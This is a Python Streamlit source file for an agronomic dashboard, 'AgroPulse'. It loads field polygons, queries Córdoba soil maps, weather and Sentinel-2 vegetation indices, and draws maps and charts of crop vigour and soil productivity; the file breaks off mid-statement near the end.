import streamlit as st
import geopandas as gpd
import folium
from streamlit_folium import st_folium
import requests
import tempfile
import os
import ee
import pandas as pd
import plotly.express as px
from datetime import datetime
import shapely.wkb

def load_spatial_data(uploaded_files):
    """Carga y concatena múltiples archivos subidos en un solo GeoDataFrame."""
    if not isinstance(uploaded_files, list):
        uploaded_files = [uploaded_files]
        
    gdfs = []
    for f in uploaded_files:
        try:
            file_ext = f.name.split('.')[-1].lower()
            
            with tempfile.NamedTemporaryFile(delete=False, suffix=f".{file_ext}") as tmp_file:
                tmp_file.write(f.getvalue())
                tmp_file_path = tmp_file.name

            try:
                if file_ext == 'kml':
                    gdf = gpd.read_file(tmp_file_path, engine='pyogrio')
                elif file_ext in ['geojson', 'json']:
                    gdf = gpd.read_file(tmp_file_path, engine='pyogrio')
                else:
                    st.error(f"Formato de {f.name} no soportado. Por favor sube .kml o .geojson")
                    continue
                
                # Asignar el nombre del archivo como propiedad del lote si no existe
                if 'Name' not in gdf.columns and 'name' not in gdf.columns:
                    gdf['Lote_Name'] = f.name.split('.')[0]
                elif 'Name' in gdf.columns:
                    gdf['Lote_Name'] = gdf['Name']
                elif 'name' in gdf.columns:
                    gdf['Lote_Name'] = gdf['name']
                    
                gdfs.append(gdf)
            finally:
                if os.path.exists(tmp_file_path):
                    os.unlink(tmp_file_path)
        except Exception as e:
            st.error(f"Error al procesar {f.name}: {e}")
            
    if not gdfs:
        return None
        
    # Concatenar todos los DataFrames
    final_gdf = pd.concat(gdfs, ignore_index=True)
    
    # Asegurar CRS WGS84
    if final_gdf.crs is None:
        final_gdf.set_crs(epsg=4326, inplace=True)
    elif final_gdf.crs.to_epsg() != 4326:
        final_gdf = final_gdf.to_crs(epsg=4326)
        
    return final_gdf

def calculate_metrics(gdf):
    """Calcula el área en hectáreas y el centroide de cada lote, y el total."""
    gdf_polys = gdf[gdf.geometry.type.isin(['Polygon', 'MultiPolygon'])].copy()
    
    if gdf_polys.empty:
        return 0.0, 0.0, 0.0, None
        
    gdf_metric = gdf_polys.to_crs(epsg=3857)
    
    # Área individual en hectáreas
    gdf_polys['Area_ha'] = gdf_metric.geometry.area / 10000
    
    # Extraer Centroide Unitario por Polígono (para poner el PIN individual)
    # Se calcula sobre gdf_polys original (EPSG 4326) para que Folium lea bien Lat/Lon
    gdf_polys['centroide_lat'] = gdf_polys.geometry.centroid.y
    gdf_polys['centroide_lon'] = gdf_polys.geometry.centroid.x
    
    # Área Total
    area_ha_total = gdf_polys['Area_ha'].sum()
    
    # Centroide Global (Para centrar la cámara del mapa general inicial y clima inicial)
    union_geom = gdf_polys.geometry.unary_union
    centroid = union_geom.centroid
    
    return area_ha_total, centroid.y, centroid.x, gdf_polys

def calculate_ip_ponderado(gdf_lotes, gdf_suelos, ip_col=None, clase_col=None):
    """Interseca Lotes y Carta de Suelos para obtener el Índice Productivo Ponderado y Clases de Suelo en Ha."""
    # Verificar que exista la columna IP o similar en la carta
    if not ip_col:
        for col in ['__ndice_de_Productividad', 'IP', 'ip', 'Ip', 'Indice_Productividad', 'Productividad']:
            if col in gdf_suelos.columns:
                ip_col = col
                break
            
    if not ip_col or ip_col not in gdf_suelos.columns:
        st.warning("⚠️ La Carta de Suelos no contiene un atributo claro de Producción (ej: 'IP'). Selecciona uno manualmente en el menú de la Barra Lateral.")
        return gdf_lotes, False
        
    if not clase_col:
        for col in ['Capacidad_de_Uso', 'Clase', 'clase', 'Suelo', 'Tipo', 'Name', 'name']:
            if col in gdf_suelos.columns:
                clase_col = col
                break
                
    if not clase_col or clase_col not in gdf_suelos.columns:
        st.warning("⚠️ No se detectó una columna de 'Clase de Suelo'. Selecciona una manualmente en la barra lateral.")
        return gdf_lotes, False
        
    # Asegurar el mismo CRS proyectado métrico para cálculos exactos de área
    lotes_3857 = gdf_lotes.to_crs(epsg=3857)
    suelos_3857 = gdf_suelos.to_crs(epsg=3857)
    
    # Realizar Intersection (no solo sjoin) para obtener las fracciones geométricas
    try:
        interseccion = gpd.overlay(lotes_3857, suelos_3857, how='intersection')
    except Exception as e:
        st.error(f"Error topológico al cruzar mapas: {e}")
        return gdf_lotes, False
        
    if interseccion.empty:
        st.error("❌ Cero coincidencias espaciales: Los polígonos del Lote y de la Carta de Suelos no se superponen en el mapa. Revisa las ubicaciones.")
        return gdf_lotes, False
    
    # Calcular área de cada fragmento
    interseccion['fracc_area'] = interseccion.geometry.area
    interseccion['fracc_area_ha'] = interseccion['fracc_area'] / 10000
    
    # Obtener el producto IP * Area para cada fragmento
    interseccion[ip_col] = pd.to_numeric(interseccion[ip_col], errors='coerce').fillna(0)
    interseccion['IP_Area'] = interseccion[ip_col] * interseccion['fracc_area']
    
    # Agrupar por el ID o nombre original del lote
    lote_id_col = 'Lote_Name' if 'Lote_Name' in interseccion.columns else 'Lote_Name_1'
    if lote_id_col not in interseccion.columns:
        interseccion['temp_id'] = interseccion.index
        lote_id_col = 'temp_id'
        
    resumen_ip = interseccion.groupby(lote_id_col).agg(
        Total_IP_Area=('IP_Area', 'sum'),
        Total_Area=('fracc_area', 'sum')
    ).reset_index()
    
    # Calcular IP Ponderado
    resumen_ip['IP_Ponderado'] = resumen_ip['Total_IP_Area'] / resumen_ip['Total_Area']
    resumen_ip['IP_Ponderado'] = resumen_ip['IP_Ponderado'].round(2).fillna(0)
    
    # --- Composición de Suelos en Hectáreas ---
    interseccion[clase_col] = interseccion[clase_col].astype(str).fillna('Desconocido')
    
    # Agrupar por lote y clase de suelo para sumar las Ha
    composicion = interseccion.groupby([lote_id_col, clase_col])['fracc_area_ha'].sum().reset_index()
    
    # Crear un string resumen por lote: "Clase A: 10.5 ha | Clase B: 5.2 ha"
    def format_soil_composition(group):
        parts = []
        for _, row in group.iterrows():
            # Limpiar el nombre de la clase si viene muy sucio (opcional dependiento del KML)
            nombre_clase = str(row[clase_col]).strip()
            parts.append(f"{nombre_clase}: {row['fracc_area_ha']:.1f} ha")
        return " | ".join(parts)
        
    composicion_str = composicion.groupby(lote_id_col).apply(format_soil_composition).reset_index(name='Clase_Suelo_Ha')
    
    # Unir composición al resumen de IP
    resumen = resumen_ip.merge(composicion_str, on=lote_id_col, how='left')
    
    # --- Clasificación Agronómica ---
    def clasificar_ip(ip):
        if ip < 40: return 'Baja'
        elif ip < 70: return 'Media'
        elif ip < 90: return 'Alta'
        else: return 'Muy Alta'
        
    resumen['Clase_Productiva'] = resumen['IP_Ponderado'].apply(clasificar_ip)
    
    # Unir resultados de vuelta al GDF de lotes originales
    merge_col = 'Lote_Name'
    if merge_col in gdf_lotes.columns:
        cols_to_merge = [lote_id_col, 'IP_Ponderado', 'Clase_Productiva', 'Clase_Suelo_Ha']
        gdf_res = gdf_lotes.merge(resumen[cols_to_merge], left_on=merge_col, right_on=lote_id_col, how='left')
        return gdf_res, True
        
    return gdf_lotes, False

def fetch_soil_data_from_wfs(gdf_lotes):
    """Obtiene datos de suelo desde IDECOR (Mapas Córdoba) usando WFS baseado en el BBOX."""
    try:
        if gdf_lotes is None or gdf_lotes.empty:
            return None
            
        # Reproyectar a EPSG:4326 si no lo está
        if gdf_lotes.crs is None or gdf_lotes.crs.to_epsg() != 4326:
            gdf_bounds = gdf_lotes.to_crs(epsg=4326)
        else:
            gdf_bounds = gdf_lotes
            
        bounds = gdf_bounds.total_bounds
        
        # Ampliamos levemente el BBOX (~1km)
        buffer_deg = 0.01 
        minx, miny, maxx, maxy = bounds[0]-buffer_deg, bounds[1]-buffer_deg, bounds[2]+buffer_deg, bounds[3]+buffer_deg
        
        url = 'https://idecor-ws.mapascordoba.gob.ar/geoserver/idecor/wfs'
        params = {
            'service': 'WFS',
            'version': '2.0.0',
            'request': 'GetFeature',
            'typeName': 'idecor:cartas_suelo_unidas_2025_ip',
            'outputFormat': 'application/json',
            'bbox': f'{minx},{miny},{maxx},{maxy},EPSG:4326',
        }
        
        response = requests.get(url, params=params, timeout=45)
        response.raise_for_status()
        
        data = response.json()
        if not data.get('features'):
            st.warning("IDECOR no devolvió datos de suelo para la ubicación. Asegúrese de que sus lotes se encuentren dentro de la Provincia de Córdoba.")
            return None
            
        gdf_suelos = gpd.GeoDataFrame.from_features(data["features"])
        # Asignar CRS EPSG:4326
        gdf_suelos.set_crs(epsg=4326, inplace=True)
        
        return gdf_suelos
    except Exception as e:
        st.error(f"Error consultando API de Suelos IDECOR: {e}")
        return None

def get_weather_data(lat, lon):
    """Consulta la API de Open-Meteo para obtener datos climáticos actuales."""
    url = "https://api.open-meteo.com/v1/forecast"
    params = {
        "latitude": lat,
        "longitude": lon,
        "current": "temperature_2m,relative_humidity_2m,wind_speed_10m",
        "timezone": "auto"
    }
    
    try:
        response = requests.get(url, params=params)
        response.raise_for_status()
        data = response.json()
        current = data.get("current", {})
        units = data.get("current_units", {})
        
        return {
            "temperature": current.get("temperature_2m"),
            "humidity": current.get("relative_humidity_2m"),
            "wind_speed": current.get("wind_speed_10m"),
            "temp_unit": units.get("temperature_2m", "°C"),
            "wind_unit": units.get("wind_speed_10m", "km/h"),
            "hum_unit": units.get("relative_humidity_2m", "%")
        }
    except Exception as e:
        st.error(f"Error al conectar con la API del clima: {e}")
        return None

@st.cache_resource
def init_ee():
    """Inicializa Earth Engine de forma cacheada para evitar reinicios en Streamlit."""
    try:
        ee.Initialize()
        return True
    except Exception as e:
        st.error(f"Error al inicializar Earth Engine: {e}. Asegúrate de tener las credenciales configuradas en tu sistema (ej. ejecutando 'earthengine authenticate').")
        return False

def get_timeseries(gdf, start_date, end_date, index_name):
    """Obtiene la serie temporal del índice seleccionado del polígono usando Sentinel-2."""
    if not init_ee():
        return None
        
    # Filtrar polígonos
    gdf_polys = gdf[gdf.geometry.type.isin(['Polygon', 'MultiPolygon'])]
    if gdf_polys.empty:
        st.warning("El archivo no contiene geometrías válidas para análisis de área o índice vegetativo.")
        return None
        
    try:
        # Convertir el polígono a ee.Geometry
        # Los KML o GeoJSON pueden tener geometrías 3D (con Z u altitud), lo que causa 
        # "Invalid GeoJSON geometry" en Earth Engine. Forzamos a que sea 2D.
        union_geom = gdf_polys.geometry.unary_union
        union_geom_2d = shapely.wkb.loads(shapely.wkb.dumps(union_geom, output_dimension=2))
        
        ee_geom = ee.Geometry(union_geom_2d.__geo_interface__)
        
        # Colección Sentinel-2 Surface Reflectance Harmonized
        s2 = ee.ImageCollection('COPERNICUS/S2_SR_HARMONIZED') \
            .filterBounds(ee_geom) \
            .filterDate(start_date, end_date)
            
        def mask_s2_clouds(image):
            """Enmascara nubes usando la banda QA60"""
            qa = image.select('QA60')
            cloudBitMask = 1 << 10
            cirrusBitMask = 1 << 11
            # Ambas banderas deben ser 0 (clear)
            mask = qa.bitwiseAnd(cloudBitMask).eq(0) \
                .And(qa.bitwiseAnd(cirrusBitMask).eq(0))
            return image.updateMask(mask)
            
        def calculate_index(image):
            """Calcula el índice vegetativo seleccionado (NDVI, EVI, GNDVI)"""
            if index_name == 'NDVI':
                index = image.normalizedDifference(['B8', 'B4']).rename('INDEX_VAL')
            elif index_name == 'GNDVI':
                index = image.normalizedDifference(['B8', 'B3']).rename('INDEX_VAL')
            elif index_name == 'EVI':
                # EVI = 2.5 * ((NIR - Red) / (NIR + 6 * Red - 7.5 * Blue + 1))
                # S2: NIR=B8, Red=B4, Blue=B2. Los valores deben estar escalados a reflectancia 0-1
                img_scaled = image.select(['B8', 'B4', 'B2']).divide(10000)
                index = img_scaled.expression(
                    '2.5 * ((NIR - RED) / (NIR + 6 * RED - 7.5 * BLUE + 1))', {
                        'NIR': img_scaled.select('B8'),
                        'RED': img_scaled.select('B4'),
                        'BLUE': img_scaled.select('B2')
                    }
                ).rename('INDEX_VAL')
                
            return image.addBands(index)
            
        def get_mean_index(image):
            """Reduce la región del polígono espacialmente para obtener el promedio a 10m y Desviación Estándar"""
            # Combinar reductores (promedio y desviación estándar)
            reducers = ee.Reducer.mean().combine(
                reducer2=ee.Reducer.stdDev(),
                sharedInputs=True
            )
            
            stats_dict = image.select('INDEX_VAL').reduceRegion(
                reducer=reducers,
                geometry=ee_geom,
                scale=10,
                maxPixels=1e9
            )
            # Retorna una Feature con fecha y valores
            return ee.Feature(None, {
                'date': image.date().format('YYYY-MM-dd'),
                'INDEX_mean': stats_dict.get('INDEX_VAL_mean'),
                'INDEX_stdDev': stats_dict.get('INDEX_VAL_stdDev')
            })
            
        # Mapear funciones a toda la colección
        s2_processed = s2.map(mask_s2_clouds).map(calculate_index)
        index_features = ee.FeatureCollection(s2_processed.map(get_mean_index))
        
        # Extraer los datos al cliente Python
        index_data = index_features.getInfo()['features']
        
        # Convertir a Pandas DataFrame
        records = []
        for feat in index_data:
            props = feat['properties']
            records.append({
                'Date': props.get('date'),
                'INDEX_mean': props.get('INDEX_mean'),
                'INDEX_stdDev': props.get('INDEX_stdDev')
            })
            
        df = pd.DataFrame(records)
        if df.empty:
            return df
            
        # Transformaciones
        df['Date'] = pd.to_datetime(df['Date'])
        
        # Limpiar datos: remover nulos
        df = df.dropna(subset=['INDEX_mean'])
        
        # Filtrar valores espurios basados en el índice (NDVI Y GNDVI suelen ser -1 a 1, EVI puede variar mas)
        if index_name in ['NDVI', 'GNDVI']:
            df = df[(df['INDEX_mean'] >= -1) & (df['INDEX_mean'] <= 1)]
        
        # Calcular el Coeficiente de Variación (CV)
        # CV = (Desviación Estándar / Media Absoluta) * 100
        # Usamos abs() para media por si llega a ser negativo (raro en vegetación pero matemáticamente posible)
        df = df[df['INDEX_mean'] != 0].copy()
        df['CV'] = (df['INDEX_stdDev'] / df['INDEX_mean'].abs()) * 100
        
        # Promediar los datos en caso de que hubiese pasadas múltiples el mismo día
        df = df.groupby('Date', as_index=False).mean()
        df = df.sort_values('Date')
        
        return df
        
    except Exception as e:
        st.error(f"Error procesando la serie temporal en Earth Engine: {e}")
        return None

def get_benchmark_timeseries(gdf, start_date, end_date, index_name, lote_col='Lote_Name'):
    """Obtiene la serie temporal concurrente de todos los lotes juntos y el promedio general (Benchmarks)."""
    if not init_ee():
        return None
        
    gdf_polys = gdf[gdf.geometry.type.isin(['Polygon', 'MultiPolygon'])]
    if gdf_polys.empty:
        st.warning("El archivo no contiene geometrías válidas.")
        return None
        
    try:
        # Convert geometries to 2D
        features = []
        for idx, row in gdf_polys.iterrows():
            geom = shapely.wkb.loads(shapely.wkb.dumps(row.geometry, output_dimension=2))
            lote_id = str(row.get(lote_col, f'Lote {idx+1}'))
            f = ee.Feature(ee.Geometry(geom.__geo_interface__), {'Lote_Name': lote_id})
            features.append(f)
            
        fc = ee.FeatureCollection(features)
        
        # Colección Sentinel-2
        s2 = ee.ImageCollection('COPERNICUS/S2_SR_HARMONIZED') \
            .filterBounds(fc.geometry()) \
            .filterDate(start_date, end_date)
            
        def mask_s2_clouds(image):
            qa = image.select('QA60')
            cloudBitMask = 1 << 10
            cirrusBitMask = 1 << 11
            mask = qa.bitwiseAnd(cloudBitMask).eq(0).And(qa.bitwiseAnd(cirrusBitMask).eq(0))
            return image.updateMask(mask)
            
        def calculate_index(image):
            if index_name == 'NDVI':
                index = image.normalizedDifference(['B8', 'B4']).rename('INDEX_VAL')
            elif index_name == 'GNDVI':
                index = image.normalizedDifference(['B8', 'B3']).rename('INDEX_VAL')
            elif index_name == 'EVI':
                img_scaled = image.select(['B8', 'B4', 'B2']).divide(10000)
                index = img_scaled.expression(
                    '2.5 * ((NIR - RED) / (NIR + 6 * RED - 7.5 * BLUE + 1))', {
                        'NIR': img_scaled.select('B8'),
                        'RED': img_scaled.select('B4'),
                        'BLUE': img_scaled.select('B2')
                    }
                ).rename('INDEX_VAL')
            return image.addBands(index)
            
        def process_image(image):
            date_str = image.date().format('YYYY-MM-dd')
            stats = image.select('INDEX_VAL').reduceRegions(
                collection=fc,
                reducer=ee.Reducer.mean().setOutputs(['INDEX_mean']),
                scale=10
            )
            # Map over to set date inside the EE environment
            def set_date(f):
                return f.set('Date', date_str)
            return stats.map(set_date)
            
        # Process and flatten
        s2_processed = s2.map(mask_s2_clouds).map(calculate_index)
        flat_fc = ee.FeatureCollection(s2_processed.map(process_image)).flatten()
        
        # Fetch data to client
        data = flat_fc.getInfo()['features']
        
        records = []
        for feat in data:
            props = feat['properties']
            records.append({
                'Date': props.get('Date'),
                'Lote_Name': props.get('Lote_Name'),
                'INDEX_mean': props.get('INDEX_mean')
            })
            
        df = pd.DataFrame(records)
        if df.empty: return df
        
        df['Date'] = pd.to_datetime(df['Date'])
        df = df.dropna(subset=['INDEX_mean'])
        if index_name in ['NDVI', 'GNDVI']:
            df = df[(df['INDEX_mean'] >= -1) & (df['INDEX_mean'] <= 1)]
            
        # Average per date per lot (to handle multiple tiles a day resolving the same lot)
        df = df.groupby(['Date', 'Lote_Name'], as_index=False).mean()
        
        # Append 'Promedio' which is the unweighted average across all lots for that day
        df_promedio = df.groupby('Date', as_index=False)['INDEX_mean'].mean()
        df_promedio['Lote_Name'] = 'Promedio'
        
        df_final = pd.concat([df, df_promedio], ignore_index=True)
        df_final = df_final.sort_values('Date')
        
        return df_final
        
    except Exception as e:
        st.error(f"Error en Benchmark Earth Engine: {e}")
        return None

def create_map(gdf, lat, lon):
    """Crea un mapa interactivo con Folium."""
    # Inicializar mapa centrado en el lote
    m = folium.Map(location=[lat, lon], zoom_start=15, tiles="CartoDB positron")
    
    # Añadir capa Satelital como opción (ESRI World Imagery)
    folium.TileLayer(
        tiles='https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
        attr='Esri',
        name='Satélite',
        overlay=False,
        control=True
    ).add_to(m)
    
    # Excluir columnas innecesarias para mostrar en el popup/tooltip
    cols_to_show = [c for c in gdf.columns if c not in ['geometry', 'temp_id', 'Area_ha_y', 'centroide_lat', 'centroide_lon']]
    
    def get_color(feature):
        clase = feature['properties'].get('Clase_Productiva', None)
        if clase == 'Muy Alta': return '#006d2c'
        elif clase == 'Alta': return '#31a354'
        elif clase == 'Media': return '#74c476'
        elif clase == 'Baja': return '#c7e9c0'
        return '#2E8B57' # default AgroPulse Green
        
    # Añadir las geometrías extraídas del GeoDataFrame
    folium.GeoJson(
        gdf,
        name="Lotes (AgroPulse)",
        style_function=lambda feature: {
            'fillColor': get_color(feature),
            'color': '#ffffff', # Borde blanco
            'weight': 2,
            'fillOpacity': 0.7,
        },
        tooltip=folium.GeoJsonTooltip(fields=cols_to_show) if cols_to_show else None
    ).add_to(m)
    
    # Añadir un Pin/marcador en el centroide de CADA lote iterando el GeoDataFrame
    if 'centroide_lat' in gdf.columns and 'centroide_lon' in gdf.columns:
        for idx, row in gdf.iterrows():
            nombre_lote = row.get('Lote_Name', f'Lote {idx+1}')
            area = row.get('Area_ha', 0)
            folium.Marker(
                [row['centroide_lat'], row['centroide_lon']],
                popup=f"📌 <b>{nombre_lote}</b><br>Superficie: {area:.2f} ha",
                tooltip=nombre_lote,
                icon=folium.Icon(color="green", icon="leaf")
            ).add_to(m)
    else:
        # Fallback de emergencia por si el GDF no pasó por calculate_metrics
        folium.Marker(
            [lat, lon],
            popup="Centroide General",
            icon=folium.Icon(color="red", icon="info-sign")
        ).add_to(m)
    
    # Añadir botón para cambiar entre capas
    folium.LayerControl().add_to(m)
    
    return m

def render_dashboard():
    # Configuración de página de Streamlit
    # st.set_page_config(page_title="AgroPulse Dashboard", page_icon="�", layout="wide")
    
    st.title('🌱 AgroPulse Dashboard')
    st.markdown("Visualiza y analiza la sanidad de tus cultivos satelitalmente.")
    
    # ---------------- BARRA LATERAL (SIDEBAR) ----------------
    with st.sidebar:
        if st.button("⬅️ Volver al Portal", use_container_width=True):
            st.session_state['current_module'] = 'Portal'
            st.rerun()
            
        st.markdown("---")
        
        # Añadir el logo de AgroPulse en la barra lateral
        if os.path.exists("logo.png"):
            st.image("logo.png", use_container_width=True)
            
        st.header("Configuraciones")
        
        # Cargador de Archivos de Lotes (Múltiple)
        st.markdown("### 1. Datos Espaciales")
        uploaded_files = st.file_uploader(
            "Cargar polígonos de lotes (.kml, .geojson)", 
            type=['kml', 'geojson', 'json'], 
            accept_multiple_files=True,
            key='global_uploader'
        )
        
        current_mod = st.session_state.get('current_module')
        
        if current_mod in ['Analisis', 'Ranking']:
            # Rango de Fechas
            st.markdown("### 2. Serie Temporal")
            # Fecha fin = Hoy, Fecha inicio = Hoy menos 3 años
            end_date_default = datetime.today()
            start_date_default = datetime(end_date_default.year - 3, end_date_default.month, end_date_default.day)
            
            date_range = st.date_input(
                "Rango de fechas",
                value=(start_date_default, end_date_default),
                max_value=end_date_default
            )
            
            if current_mod == 'Analisis':
                # Umbral CV
                st.markdown("### 3. Umbrales")
                cv_threshold = st.slider(
                    "Umbral de Alerta CV (%)",
                    min_value=0, max_value=100, value=25,
                    help="Define la línea roja punteada en el gráfico de Coeficiente de Variación."
                )
                st.markdown("### 4. Índices")
            else:
                cv_threshold = 25
                st.markdown("### 4. Índices")
            
            # Selector de Índice
            index_choice = st.selectbox(
                "Índice a Visualizar",
                options=["NDVI", "EVI", "GNDVI"],
                index=0,
                help="NDVI: Vigor general. EVI: Sensible a alta biomasa. GNDVI: Sensible a clorofila/nitrógeno."
            )
            
            st.markdown("---")
            btn_text = "🚀 Procesar Serie Histórica" if st.session_state.get('current_module') == 'Analisis' else "🚀 Generar Benchmark Temporal"
            process_button = st.button(btn_text, use_container_width=True, type="primary")
        else:
            # Declaramos variables por defecto para evitar NameError en app
            date_range = (None, None)
            cv_threshold = 25
            index_choice = "NDVI"
            process_button = False

    # Inicializar la variable de estado para la serie temporal si no existe
    if 'df_timeseries' not in st.session_state:
        st.session_state['df_timeseries'] = None
    if 'df_benchmark' not in st.session_state:
        st.session_state['df_benchmark'] = None

    # ---------------- ÁREA PRINCIPAL ----------------
    # Guardar en memoria si hay nuevos archivos cargados
    if uploaded_files:
        with st.spinner('Procesando datos de los lotes...'):
            st.session_state['saved_gdf'] = load_spatial_data(uploaded_files)
            
    gdf = st.session_state.get('saved_gdf', None)
            
    if gdf is not None and not gdf.empty:
            
            # Cálculo de la información espacial (Centroide, Area Total y GDF modificado con areas)
            area_ha, lat, lon, gdf_processed = calculate_metrics(gdf)
            
            # Procesamiento de Suelos
            soil_processed = False
            # Consultamos la carta de suelos en background SOLAMENTE si vamos a armar el Ranking
            if current_mod == 'Ranking':
                with st.spinner('Consultando Carta de Suelos automáticos a IDECOR (Córdoba)... 🌍'):
                    gdf_suelos = fetch_soil_data_from_wfs(gdf_processed)
                    if gdf_suelos is not None and not gdf_suelos.empty:
                        # Usar directamente los nombres estándar de IDECOR
                        ip_col = 'ip'
                        clase_col = 'cap'
                        
                        gdf_processed, soil_processed = calculate_ip_ponderado(gdf_processed, gdf_suelos, ip_col, clase_col)
                        
            # Solicitud de información climática
            with st.spinner('Consultando el clima actual...'):
                weather_data = get_weather_data(lat, lon)
            
            # Renderizar Mapa principal en la parte superior
            st.subheader("🗺️ Mapa General")
            m = create_map(gdf_processed, lat, lon)
            
            # Dibujar Carta de Suelos sobre el mapa si se cargó para ver las capas superpuestas
            if soil_processed and 'gdf_suelos' in locals():
                folium.GeoJson(
                    gdf_suelos,
                    name="Carta de Suelos",
                    style_function=lambda feature: {
                        'fillColor': '#8c564b', # Marrón
                        'color': '#8c564b',
                        'weight': 1,
                        'fillOpacity': 0.2,
                    },
                    tooltip=folium.GeoJsonTooltip(fields=['IP'] if 'IP' in gdf_suelos.columns else [])
                ).add_to(m)
                folium.LayerControl().add_to(m)
                
            st_folium(m, width="100%", height=400, returned_objects=[])
            
            st.divider()
            
            # --- MODO RANKING ---
            if st.session_state['current_module'] == 'Ranking':
                st.subheader("📋 Ranking Productivo de Inventario")
            
                # Armar tabla analítica
                report_df = pd.DataFrame()
                if 'Lote_Name' in gdf_processed.columns:
                    report_df['Nombre del Lote'] = gdf_processed['Lote_Name'].astype(str)
                else:
                    report_df['Nombre del Lote'] = [f"Lote {i+1}" for i in range(len(gdf_processed))]
                    
                report_df['Superficie (ha)'] = gdf_processed['Area_ha'].round(2)
                
                if soil_processed and 'IP_Ponderado' in gdf_processed.columns:
                    report_df['IP Ponderado'] = gdf_processed['IP_Ponderado']
                    
                    if 'Clase_Productiva' in gdf_processed.columns:
                        report_df['Clasif. Productiva'] = gdf_processed['Clase_Productiva']
                    else:
                        def clasificar_ip(ip):
                            if ip < 40: return 'Baja'
                            elif ip < 70: return 'Media'
                            elif ip < 90: return 'Alta'
                            else: return 'Muy Alta'
                        report_df['Clasif. Productiva'] = report_df['IP Ponderado'].apply(clasificar_ip)
                    
                    # Añadir exclusivamente la composición en Ha
                    if 'Clase_Suelo_Ha' in gdf_processed.columns:
                        report_df['Clase de Suelo'] = gdf_processed['Clase_Suelo_Ha']
                else:
                    report_df['IP Ponderado'] = "Carta Suelo No Disponible"
                    
                # Ordenar jerárquicamente por Producción Potencial si existe IP
                if 'IP Ponderado' in report_df.columns and soil_processed:
                    report_df = report_df.sort_values(by='IP Ponderado', ascending=False)
                    
                # Dibujar Tabla
                st.dataframe(
                    report_df, 
                    use_container_width=True, 
                    hide_index=True,
                    column_config={
                        "IP Ponderado": st.column_config.ProgressColumn(
                            "IP Ponderado",
                            format="%f",
                            min_value=0,
                            max_value=100,
                        ),
                        "Clasif. Productiva": st.column_config.TextColumn(
                            "Clasificación IP"
                        )
                    }
                )
                
                # Gráfico de barras de Ranking de Productividad
                if soil_processed and 'IP Ponderado' in report_df.columns:
                    fig_bar = px.bar(
                        report_df, 
                        x='Nombre del Lote', 
                        y='IP Ponderado',
                        title='Ranking de Lotes por Índice Productivo Ponderado (Suelos)',
                        color='Nombre del Lote',
                        hover_data=report_df.columns
                    )
                    # Ordenar el gráfico visualmente de mayor a menor IP
                    fig_bar.update_layout(
                        xaxis={'categoryorder':'total descending'},
                        xaxis_title="Lotes Activos", 
                        yaxis_title="IP Ponderado (%)", 
                        plot_bgcolor="rgba(0,0,0,0)",
                        showlegend=False
                    )
                    st.plotly_chart(fig_bar, use_container_width=True)
                else:
                    st.info("Para visualizar el gráfico analítico, asegúrese de cargar una Carta de Suelos.")

                # --- BENCHMARKING TEMPORAL ---
                st.divider()
                st.subheader(f"📈 Benchmarking Temporal ({index_choice})")
                
                if process_button:
                    if len(date_range) == 2:
                        start_str = date_range[0].strftime('%Y-%m-%d')
                        end_str = date_range[1].strftime('%Y-%m-%d')
                        with st.spinner('Consultando satélites para el Benchmark de TODOS los lotes... 🛰️'):
                            st.session_state['df_benchmark'] = get_benchmark_timeseries(gdf_processed, start_str, end_str, index_choice)
                    else:
                        st.warning("Selecciona una fecha de inicio y una de fin en la barra lateral antes de consultar.")
                        
                df_bench = st.session_state.get('df_benchmark', None)
                
                if df_bench is None:
                    st.info("Presioná el botón 'Generar Benchmark Temporal' en la barra lateral para comparar la evolución de vigor histórica de todos tus lotes.")
                else:
                    if not df_bench.empty:
                        # Line chart with everything
                        fig_bench = px.line(
                            df_bench,
                            x='Date',
                            y='INDEX_mean',
                            color='Lote_Name',
                            markers=True,
                            title=f'Comparativa de Vigor Histórico: {index_choice}',
                            labels={'Date': 'Fecha', 'INDEX_mean': index_choice, 'Lote_Name': 'Lote'}
                        )
                        
                        # Set Promedio to black and thicker line
                        for trace in fig_bench.data:
                            if trace.name == 'Promedio':
                                trace.line.color = 'black'
                                trace.line.width = 4
                                trace.marker.size = 8
                            else:
                                trace.line.width = 2
                                trace.marker.size = 4
                                
                        fig_bench.update_layout(
                            hovermode="x unified",
                            plot_bgcolor="rgba(0,0,0,0)",
                            xaxis_title="Fecha de Toma",
                            yaxis_title=f"Valor {index_choice}"
                        )
                        st.plotly_chart(fig_bench, use_container_width=True)
                    else:
                        st.warning("No se encontraron imágenes válidas o libres de nubes para el rango de fechas seleccionado en la región de tus lotes.")
            
            # --- MODO ANÁLISIS INDIVIDUAL ---
            elif st.session_state['current_module'] == 'Analisis':
                st.subheader("🔍 Análisis Individual del Lote")
                
                lote_seleccionado = None
                if 'Lote_Name' in gdf_processed.columns:
                    nombres_lotes = gdf_processed['Lote_Name'].unique().tolist()
                    lote_seleccionado = st.selectbox("Seleccione un Lote para analizar:", nombres_lotes)
                else:
                    st.warning("No se detectaron nombres de lotes. Se analizará el polígono global.")
                
                # Filtrar GDF si hay selección
                gdf_analisis = gdf_processed.copy()
                if lote_seleccionado:
                    gdf_analisis = gdf_processed[gdf_processed['Lote_Name'] == lote_seleccionado]
                
                tab_temporal, tab_clima = st.tabs([
                    "📈 Serie Temporal Índice y CV", "🌤️ Clima Actual y Superficie"
                ])
                
                # Procesamos Serie Temporal solo si el usuario pulsa el botón
                if process_button:
                    if len(date_range) == 2:
                        start_str = date_range[0].strftime('%Y-%m-%d')
                        end_str = date_range[1].strftime('%Y-%m-%d')
                        with st.spinner('Consultando satélites para el lote seleccionado...'):
                            st.session_state['df_timeseries'] = get_timeseries(gdf_analisis, start_str, end_str, index_choice)
                    else:
                        st.warning("Selecciona una fecha de inicio y una de fin en la barra lateral antes de consultar.")
                
                # Cargar desde estado persistente
                df_timeseries = st.session_state.get('df_timeseries', None)
            
                with tab_temporal:
                    st.markdown(f"**Evolución Temporal: {index_choice}**")
                    
                    if df_timeseries is None:
                        st.info("Presione el botón en la barra lateral para calcular los datos satelitales")
                    else:
                        if not df_timeseries.empty:
                            # 1. Generar gráfico interactivo del índice 
                            fig_index = px.line(
                                df_timeseries, 
                                x='Date', 
                                y='INDEX_mean', 
                                markers=True,
                                title=f'Serie {index_choice} Promedio (Lote: {lote_seleccionado})',
                                labels={'Date': 'Fecha', 'INDEX_mean': f'Valor {index_choice}'},
                                color_discrete_sequence=['#2ca02c']
                            )
                            fig_index.update_layout(
                                hovermode="x unified",
                                xaxis_title="Fecha de Toma",
                                yaxis_title=f"Índice {index_choice}",
